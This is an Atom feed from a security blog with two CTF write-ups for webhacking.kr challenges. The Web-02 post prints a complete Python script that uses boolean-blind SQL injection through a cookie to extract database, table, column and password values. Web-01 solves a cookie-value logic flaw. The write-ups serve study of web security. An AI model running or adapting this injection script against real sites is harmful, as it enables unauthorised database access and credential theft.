<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bitthr3at</title>
  
  
  <link href="https://bitthr3at.github.io/atom.xml" rel="self"/>
  
  <link href="https://bitthr3at.github.io/"/>
  <updated>2023-03-26T11:39:44.985Z</updated>
  <id>https://bitthr3at.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Korean Web Challenges [Web-02]</title>
    <link href="https://bitthr3at.github.io/Korean%20Web%20Challenges%20[Web-02]/"/>
    <id>https://bitthr3at.github.io/Korean%20Web%20Challenges%20[Web-02]/</id>
    <published>2023-02-11T18:30:00.000Z</published>
    <updated>2023-03-26T11:39:44.985Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>This is the second challenge in the Korean Web Challenges series, and we have provided an example page below.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-1.png" loading="lazy"></p><p>When we look at the page source (<code>ctrl+U</code>), we see that it has a hidden PHP page called <code>admin.php</code></p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-2.png" loading="lazy"></p><p>When we go to that page, we can see that it asks for a password.<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-3.png" loading="lazy"></p><p>Any random password will result in an error; I even tried brute-forcing it, but that did not work.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-4.png" loading="lazy"></p><p>So it&#39;s time to look closely at both the &quot;Restricted area&quot; page and the &quot;admin.php&quot; page. The &quot;Restricted area&quot; page has a date in an HTML comment.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-5.png" loading="lazy"></p><p>And admin.php only has a form that asks for the password.<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-6.png" loading="lazy"></p><p> it&#39;s request to verify the password was like below (I also tried Blind SQL bypass here)<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-7.png" loading="lazy"></p><p>After my multiple attempts to bypass above password verify API through bruteforce or sql injection i was having no success then i thought to check that Restriction page again </p><p>And I tried a lot of things on this page before, like using a lot of headers here to pretend that I am requesting the page from a local trusted system, but still no luck.<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/snap.png" loading="lazy"></p><p>Later, I started to focus on a behaviour that I knew about but hadn&#39;t tried much of: this time cookie had an epoch timestamp, and whatever time you put in the cookie in epoc format, it would add 3 hours to it and show the date in the response as an html comment. This meant that something dynamic was going on here.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-8.png" loading="lazy"></p><p>I tried a straightforward SQL sleep command, and to my suprise, it workedðŸ¤¯. Before I found this, I tried a lot of different approaches, but I honestly didn&#39;t think it would be that easy to just exploit the SQL and pull the password out of the database, i thought there would be some tricks around it but i was wrong.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-9.png" loading="lazy"></p><p>I started testing more SQLi payloads to find out what kinds of SQLi are possible here besides time-based SQLi. I found that boolean blind worked fine, and in the case of true conditions, the date ended with the number <code>1</code><br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-10.png" loading="lazy"></p><p>and if condition is false then it ends it with 0, this is useful when crafting script to automate this.<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-11.png" loading="lazy"></p><p>So Now the best part, that is writing some code to exfiltrate the password.</p><p>This was easy, first i extracted the database name<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-12.png" loading="lazy"><br>Then all table names<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-13.png" loading="lazy"></p><p>then columns of tables<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-14.png" loading="lazy"></p><p>and finally the password<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-15.png" loading="lazy"><br>and challenge solved.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/web-02-17.png" loading="lazy"></p><p><strong>THE SCRIPT EXPLANATION</strong></p><p>First we did some imports</p><p>requests - for sending http  requests<br>sys - for taking command line arguments<br>urllib3 - just to disable the ssl warning that python give if you ask it to send traffic through burp</p><p>url - target url</p><p>proxies - to set burp proxy to debug any runtime error in requests<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/snap%202.png" loading="lazy"></p><p><strong>Functions</strong> - get_length</p><p>The purpose of this function is to just check the length of a SQLi output<br><em>For example</em><br>you give it <code>database()</code> it will inject it in cookie along with length function and it will try to guess length of this <code>database()</code>via iterating from 0 to 100 and if condition seems true that is <code>1</code> in the end of the date then it retrun that lenght back.</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/snap%203.png" loading="lazy"></p><p><strong>Functions</strong> - check_condition</p><p>This function i specially created to avoid writing same &quot;condition match code&quot; again and again, so i pass it my payload and it just tells if condition is true or false.<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/snap%204.png" loading="lazy"></p><p><strong>Functions</strong> - extdata</p><p>This is most important function in the script becuase it do most of the logic part.</p><p>on line 30 it uses our old get_length funtion to get the expected output length</p><p>then from line 31 to 66  it iterates through different ascii charaters </p><p>Between line 37 to 44  it do a range from 58 to 47 for numbers  9 to 0<br><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/snap%206.png" loading="lazy"></p><p>then from  line 46 to 56 it first check if it found a valid number and if not then it runs this new loop for alphabets that too only with lowercase alphabets becuase  mysql  is not case sensitive in comparison operations</p><p>At last from line  59 to 67 it checks for special characters</p><p>And through manually running below loops i was able to exfiltrate complete data. </p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-02%5D/snap%207.png" loading="lazy"></p><p><strong>COMPLETE SCRIPT</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://webhacking.kr/challenge/web-02/&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">proxies= &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length</span>(<span class="params">func</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">inj = <span class="string">f&quot;1676199993+AND+length(<span class="subst">&#123;func&#125;</span>)=<span class="subst">&#123;<span class="built_in">str</span>(j)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">f&quot;time=<span class="subst">&#123;inj&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, headers=headers, proxies=proxies, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;code&quot;+ str(res.status_code))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;body len &quot;+ str(len(res.content)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2070-01-01 09:00:01&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_condition</span>(<span class="params">inj</span>):</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">f&quot;time=<span class="subst">&#123;inj&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, headers=headers, proxies=proxies, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2070-01-01 09:00:01&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extdata</span>(<span class="params">func</span>):</span><br><span class="line"></span><br><span class="line">length = get_length(func)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cursor <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># start = 126</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># end = 32</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">58</span></span><br><span class="line"></span><br><span class="line">end = <span class="number">47</span></span><br><span class="line"></span><br><span class="line">hit = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">inj = <span class="string">f&quot;1676199993+AND+substring(<span class="subst">&#123;func&#125;</span>,<span class="subst">&#123;<span class="built_in">str</span>(cursor)&#125;</span>,1)=<span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;&quot;&quot;&#123;&quot;organization_id&quot;:&quot;950624&#x27; AND substring(&quot;&quot;&quot;+func+&quot;&quot;&quot;,&quot;&quot;&quot;+str(cursor)+&quot;&quot;&quot;,1)=&#x27;&quot;&quot;&quot;+chr(i)+&quot;&quot;&quot;&quot;,&quot;organization_role&quot;:&quot;Admin&quot;&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_condition(inj):</span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">hit = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#new loop for alphabets</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hit==<span class="literal">False</span>:</span><br><span class="line"></span><br><span class="line">alpha_lowercase_range = [<span class="number">97</span>,<span class="number">98</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">103</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">106</span>,<span class="number">107</span>,<span class="number">108</span>,<span class="number">109</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">119</span>,<span class="number">120</span>,<span class="number">121</span>,<span class="number">122</span>]</span><br><span class="line"></span><br><span class="line">alpha_upprcase_range = [<span class="number">65</span>,<span class="number">66</span>,<span class="number">67</span>,<span class="number">68</span>,<span class="number">69</span>,<span class="number">70</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">74</span>,<span class="number">75</span>,<span class="number">76</span>,<span class="number">77</span>,<span class="number">78</span>,<span class="number">79</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">90</span>] <span class="comment">#Mysql is not case sensitive in comparison operations</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alpha_lowercase_range:</span><br><span class="line"></span><br><span class="line">inj = <span class="string">f&quot;1676199993+AND+substring(<span class="subst">&#123;func&#125;</span>,<span class="subst">&#123;<span class="built_in">str</span>(cursor)&#125;</span>,1)=&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span>&#x27;--&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_condition(inj):</span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">hit=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#new loop for special characters</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hit==<span class="literal">False</span>:</span><br><span class="line"></span><br><span class="line">special_range = [<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">61</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">91</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">95</span>,<span class="number">96</span>,<span class="number">123</span>,<span class="number">124</span>,<span class="number">125</span>,<span class="number">126</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> special_range:</span><br><span class="line"></span><br><span class="line">inj = <span class="string">f&quot;1676199993+AND+substring(<span class="subst">&#123;func&#125;</span>,<span class="subst">&#123;<span class="built_in">str</span>(cursor)&#125;</span>,1)=&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span>&#x27;--&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_condition(inj):</span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#On true 645</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">######get table names</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for t in range(0,44):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;Table &quot;+str(t) )</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># extdata(&quot;(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+&quot;+str(t)+&quot;,1)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># extdata(&quot;database()&quot;)</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#####get column names</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for t in range(0,20):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;column &quot;+str(t) +&quot; of admin_area_pw table&quot; )</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># extdata(&quot;(select+column_name+from+information_schema.columns+where+table_name=&#x27;admin_area_pw&#x27;+limit+&quot;+str(t)+&quot;,1)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#####get rows</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># columns = [&quot;id&quot;, &quot;level&quot;,&quot;summary&quot;, &quot;template_id&quot;, &quot;updated_at&quot;, &quot;vm_pool_id&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># columns = [&quot;created_at&quot;,&quot;id&quot;,&quot;is_active&quot;,&quot;updated_at&quot;,&quot;user_name&quot;]</span></span><br><span class="line"></span><br><span class="line">columns = [<span class="string">&quot;pw&quot;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> columns:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;column &quot;</span>+<span class="built_in">str</span>(i) +<span class="string">&quot;&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">extdata(<span class="string">f&quot;(select+<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>+from+admin_area_pw+limit+<span class="subst">&#123;t&#125;</span>,1)&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;This is the second challenge in the Korean Web Cha</summary>
      
    
    
    
    <category term="ctf" scheme="https://bitthr3at.github.io/categories/ctf/"/>
    
    
    <category term="web" scheme="https://bitthr3at.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Korean Web Challenges [Web-01]</title>
    <link href="https://bitthr3at.github.io/Korean%20Web%20Challenges%20[Web-01]/"/>
    <id>https://bitthr3at.github.io/Korean%20Web%20Challenges%20[Web-01]/</id>
    <published>2023-01-26T07:32:53.000Z</published>
    <updated>2023-03-26T10:06:10.236Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Korean Web Challenges is a CTF challenges series which has 75 web specific challenges in it that eventually grow in difficulty as you move ahead, starting with the first challenge i came across this single page as you see below</p><p><img src="/./Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_1.png" loading="lazy"></p><span id="more"></span><p>From here the first poke around thing was eventually this &quot;viewsource&quot; link, upon clicking it opens this page with bunch of PHP and HTML code</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_2.png" loading="lazy"></p><p>So certainly this viewsoruce was not the only viewsource of the html page that we were seeing initially instead challenge owner created this to give us some hint about the challenge, so lets straight dive into it and examine it.</p><h4 id="CODE-1"><a href="#CODE-1" class="headerlink" title="CODE 1"></a>CODE 1</h4><p>it is a php code OK!,</p><ul><li>line 1 it import functions from <code>config.php</code></li><li>line 2, it except a <code>view-source</code> get parameter to have a value &#x3D; 1, on this condition it executes <code>view-source()</code> function</li><li>line 3-4, checks if cookie with name <code>user_lv</code> is missing in request and then generate a cookie and sent back in response.<br><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/snap.png" loading="lazy"></li></ul><p>Till this part the code is only rendering this view-source hint page with get parameter <code>view-source=1</code> and then just create cookie with name <code>user_lv</code> and value &#x3D; 1</p><h4 id="CODE-2"><a href="#CODE-2" class="headerlink" title="CODE 2"></a>CODE 2</h4><p>We have skipped the html part since it is very basic and nothing catchy in it</p><p>2nd code snippet is also php, lets break it</p><ul><li>Line 1, If cookie <code>user_lv</code> value is not numeric then set the value to 1</li><li>Line 2, If cookie <code>user_lv</code> value is greater than or equal to 4 then again set the value to 1</li><li>Line 3, If cookie <code>user_lv</code> value is greater than 3 then solve it!</li><li>Line 4, Just print the <code>user_lv</code> as level (XSS)</li></ul><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/snap%201.png" loading="lazy"></p><p>from code 2, line 2 &amp; 3 it is clear that the code will crack if <code>user_lv</code> value is &gt; 3 and &lt; 4, so the straightforward answer is any number decimal number between 3 to 4 i.e. 3.1 to 3.9</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>we choosen 3.5, wolla! it solvedðŸ’ª</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_8.png" loading="lazy"></p><h4 id="Some-Failed-Attempts"><a href="#Some-Failed-Attempts" class="headerlink" title="Some Failed Attempts"></a>Some Failed Attempts</h4><p>WRONG cookie values</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_3.png" loading="lazy"></p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_4.png" loading="lazy"></p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_5.png" loading="lazy"></p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_6.png" loading="lazy"></p><p>Even with correct answer it yelled at me becuase i forgot to the login challenge portal and php session cookie was missing in request</p><p><img src="/Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_7.png" loading="lazy"></p><p>You can try challenge <span class="exturl" data-url="aHR0cHM6Ly93ZWJoYWNraW5nLmtyL2NoYWxsZW5nZS93ZWItMDEv">here<i class="fa fa-external-link-alt"></i></span> (Don&#39;t forget to login ðŸ˜„)</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;Korean Web Challenges is a CTF challenges series which has 75 web specific challenges in it that eventually grow in difficulty as you move ahead, starting with the first challenge i came across this single page as you see below&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/./Korean%20Web%20Challenges%20%5BWeb-01%5D/Web-01_1.png&quot; loading=&quot;lazy&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://bitthr3at.github.io/categories/ctf/"/>
    
    
    <category term="web" scheme="https://bitthr3at.github.io/tags/web/"/>
    
  </entry>
  
</feed>
